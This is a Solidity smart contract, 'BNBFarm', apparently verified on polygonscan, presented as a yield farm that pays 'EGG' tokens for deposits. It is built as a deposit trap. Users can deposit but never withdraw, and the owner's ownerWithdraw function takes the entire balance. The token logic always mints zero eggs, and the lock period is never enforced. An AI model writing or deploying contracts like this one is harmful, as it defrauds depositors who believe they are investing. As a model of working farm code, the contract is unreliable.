/**
 *Submitted for verification at polygonscan.com on 2023-06-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BNBFarm {
    address private owner;
    mapping(address => uint256) private balances;
    mapping(address => uint256) private timestamps;
    mapping(address => uint256) private eggsBalance;
    uint256 private constant minimumDeposit = 0.001 ether;
    uint256 private constant lockDuration = 5 days;
    string private constant tokenName = "EGGS";
    string private constant tokenSymbol = "EGG";
    uint256 private totalDeposits;
    uint256 private eggsPerBNB;

    event Deposit(address indexed user, uint256 amount);
    event EggsMinted(address indexed user, uint256 amount);
    event EggsTransferred(
        address indexed from,
        address indexed to,
        uint256 amount
    );

    constructor() {
        owner = msg.sender;
        totalDeposits = 0;
        eggsPerBNB = 1000000; // Cantidad inicialmente alta para los primeros usuarios
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    function deposit() external payable {
        require(msg.value >= minimumDeposit, "Minimum deposit amount not met");
        balances[msg.sender] += msg.value;
        timestamps[msg.sender] = block.timestamp;
        uint256 eggsToMint = calculateEggsToMint();
        eggsBalance[msg.sender] += eggsToMint;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
        emit EggsMinted(msg.sender, eggsToMint);
    }

    function transferEggs(address to, uint256 amount) external {
        require(eggsBalance[msg.sender] >= amount, "Insufficient eggs balance");
        eggsBalance[msg.sender] -= amount;
        eggsBalance[to] += amount;
        emit EggsTransferred(msg.sender, to, amount);
    }

    function calculateEggsToMint() private view returns (uint256) {
        uint256 previousEggsBalance = eggsBalance[msg.sender];
        uint256 eggsToMint = (previousEggsBalance * 5) / 1000; // Disminuye en un 0.5%
        return eggsToMint;
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }

    function getTimestamp(address user) external view returns (uint256) {
        return timestamps[user];
    }

    function getEggsBalance(address user) external view returns (uint256) {
        return eggsBalance[user];
    }

    function getTokenName() external pure returns (string memory) {
        return tokenName;
    }

    function getTokenSymbol() external pure returns (string memory) {
        return tokenSymbol;
    }

    function getTotalDeposits() external view returns (uint256) {
        return totalDeposits;
    }

    function getEggsPerBNB() external view returns (uint256) {
        return eggsPerBNB;
    }

    function ownerWithdraw() external onlyOwner {
        require(
            address(this).balance > 0,
            "No balance available for withdrawal"
        );
        payable(owner).transfer(address(this).balance);
    }
}